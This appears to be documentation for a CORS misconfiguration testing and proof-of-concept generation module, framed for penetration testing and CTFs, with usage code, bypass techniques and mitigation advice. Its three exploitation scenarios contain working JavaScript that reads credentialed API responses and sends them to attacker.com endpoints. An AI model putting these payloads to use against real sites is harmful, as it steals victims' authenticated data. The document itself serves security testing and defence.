# CORS Exploitation Module

## Overview

The CORS (Cross-Origin Resource Sharing) exploitation module provides automated testing for CORS misconfigurations and generates proof-of-concept exploits for data exfiltration attacks.

## Features

### CORS Misconfiguration Testing

1. **Null Origin Acceptance**
   - Tests if the endpoint accepts `Origin: null`
   - Common in sandboxed iframes and data URIs
   - Can be exploited for data exfiltration

2. **Reflected Origin**
   - Tests if any origin is reflected in `Access-Control-Allow-Origin`
   - Indicates no origin validation
   - High severity vulnerability

3. **Wildcard with Credentials**
   - Tests for `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`
   - Technically invalid but sometimes misconfigured
   - Can lead to credential theft

4. **Regex Bypass Techniques**
   - Pre-domain bypass: `attacker.target.com`
   - Post-domain bypass: `target.com.attacker.com`
   - Subdomain wildcard: `evil.target.com`
   - Null byte injection
   - Underscore/dash bypasses

5. **Protocol Bypass**
   - Tests HTTP/HTTPS confusion
   - Checks if HTTPS endpoint accepts HTTP origin

### PoC Generation

1. **HTML PoC**
   - Complete HTML page for demonstrating the vulnerability
   - Interactive button to trigger exploitation
   - Displays exfiltrated data
   - Includes safe demonstration instructions

2. **JavaScript PoC**
   - Standalone JavaScript code for exploitation
   - Both `fetch` and `XMLHttpRequest` implementations
   - Automated data exfiltration to attacker server
   - Can be embedded in any page

## Usage

### Basic Testing

```python
from app.modules.cors_exploitation import test_cors_misconfiguration
from app.core.request_handler import RequestHandler

# Initialize request handler
request_handler = RequestHandler()

# Test endpoint for CORS misconfigurations
results = await test_cors_misconfiguration(
    target_url="https://target.com/api/user/profile",
    request_handler=request_handler,
    requires_authentication=True,
)

# Process results
for result in results:
    if result.is_vulnerable:
        print(f"Vulnerability found: {result.misconfiguration_type.value}")
        print(f"Malicious origin: {result.malicious_origin}")
        print(f"Allows credentials: {result.allows_credentials}")
        print(f"Confidence: {result.confidence}")
        
        # Save PoC files
        if result.poc_html:
            with open("cors_poc.html", "w") as f:
                f.write(result.poc_html)
        
        if result.poc_javascript:
            with open("cors_poc.js", "w") as f:
                f.write(result.poc_javascript)
```

### Advanced Testing

```python
from app.modules.cors_exploitation import CORSTester, CORSTestPoint

# Initialize tester
tester = CORSTester(request_handler)

# Create test point with custom headers
test_point = CORSTestPoint(
    url="https://target.com/api/sensitive-data",
    method="GET",
    headers={
        "Authorization": "Bearer token123",
        "X-Custom-Header": "value",
    },
    cookies={
        "session": "abc123",
    },
    requires_authentication=True,
)

# Test endpoint
results = await tester.test_endpoint(test_point)
```

## Vulnerability Types

### CORSMisconfigurationType Enum

- `NULL_ORIGIN`: Accepts null origin
- `WILDCARD_ORIGIN`: Uses wildcard with credentials
- `REFLECTED_ORIGIN`: Reflects any origin
- `REGEX_BYPASS`: Regex validation bypass
- `SUBDOMAIN_WILDCARD`: Accepts any subdomain
- `PRE_DOMAIN_BYPASS`: Accepts attacker.target.com
- `POST_DOMAIN_BYPASS`: Accepts target.com.attacker.com
- `PROTOCOL_BYPASS`: HTTP/HTTPS confusion

## Data Models

### CORSTestPoint

Represents a CORS test point:
- `url`: Target URL
- `method`: HTTP method (default: GET)
- `headers`: Custom headers
- `cookies`: Session cookies
- `requires_authentication`: Whether authentication is needed

### CORSResult

Result of CORS testing:
- `test_point`: The tested endpoint
- `is_vulnerable`: Whether vulnerability was found
- `misconfiguration_type`: Type of misconfiguration
- `malicious_origin`: The malicious origin that works
- `allows_credentials`: Whether credentials are allowed
- `confidence`: Confidence score (0.0-1.0)
- `evidence`: List of evidence strings
- `response`: HTTP response
- `poc_html`: HTML proof-of-concept
- `poc_javascript`: JavaScript proof-of-concept
- `metadata`: Additional metadata

## Exploitation Scenarios

### Scenario 1: Null Origin Exploitation

```html
<!-- Attacker hosts this in a sandboxed iframe -->
<iframe sandbox="allow-scripts" srcdoc="
<script>
fetch('https://target.com/api/user/profile', {
    credentials: 'include'
})
.then(r => r.text())
.then(data => {
    // Send to attacker
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: data
    });
});
</script>
"></iframe>
```

### Scenario 2: Reflected Origin Exploitation

```javascript
// Attacker hosts this on attacker.com
fetch('https://target.com/api/sensitive-data', {
    credentials: 'include'
})
.then(response => response.json())
.then(data => {
    // Exfiltrate data
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
```

### Scenario 3: Regex Bypass Exploitation

```javascript
// If target.com accepts attacker.target.com
// Attacker registers attacker.target.com domain
// Then hosts exploitation code there
fetch('https://target.com/api/admin', {
    credentials: 'include'
})
.then(response => response.text())
.then(adminData => {
    // Steal admin data
    navigator.sendBeacon('https://attacker.com/admin-data', adminData);
});
```

## Mitigation Recommendations

1. **Whitelist Specific Origins**
   ```
   Access-Control-Allow-Origin: https://trusted-domain.com
   ```

2. **Validate Origin Header**
   - Check against a whitelist of allowed origins
   - Use exact string matching, not regex
   - Validate protocol (HTTP vs HTTPS)

3. **Avoid Null Origin**
   - Never accept `Origin: null`
   - Reject requests with null origin

4. **Never Use Wildcard with Credentials**
   - Don't use `*` with `Access-Control-Allow-Credentials: true`
   - This is invalid and insecure

5. **Implement Proper CORS Policy**
   ```python
   allowed_origins = ['https://app.example.com', 'https://admin.example.com']
   
   if request.headers.get('Origin') in allowed_origins:
       response.headers['Access-Control-Allow-Origin'] = request.headers['Origin']
       response.headers['Access-Control-Allow-Credentials'] = 'true'
   ```

## CTF Tips

1. **Look for API Endpoints**
   - APIs often have CORS misconfigurations
   - Test `/api/*` endpoints first

2. **Check Authenticated Endpoints**
   - CORS issues are more severe with credentials
   - Test endpoints that require authentication

3. **Try All Bypass Techniques**
   - Don't stop at the first test
   - Regex bypasses are common

4. **Check Response Headers**
   - Look for `Access-Control-Allow-Origin`
   - Check if `Access-Control-Allow-Credentials` is true

5. **Test Different Methods**
   - Some endpoints only have CORS issues on specific methods
   - Test GET, POST, PUT, DELETE

## Requirements Validation

This module validates the following requirements:

- **Requirement 44.1**: Tests for null origin acceptance, wildcard misconfigurations, and regex bypasses
- **Requirement 44.2**: Generates proof-of-concept HTML pages demonstrating data exfiltration
- **Requirement 44.3**: Identifies endpoints that reflect the Origin header without proper validation
- **Requirement 44.4**: Tests for authenticated CORS exploitation with credentials
- **Requirement 44.5**: Provides JavaScript exploit code for automated data extraction

## Example Output

```
CORS Vulnerability Found!
========================
Type: Reflected Origin
Target: https://target.com/api/user/profile
Malicious Origin: https://attacker.com
Allows Credentials: True
Confidence: 95%

Evidence:
- CORS misconfiguration: Origin reflected without validation
- Malicious origin: https://attacker.com
- Access-Control-Allow-Origin: https://attacker.com
- Access-Control-Allow-Credentials: true
- Credentials allowed: True

PoC files generated:
- cors_poc.html
- cors_poc.js
```
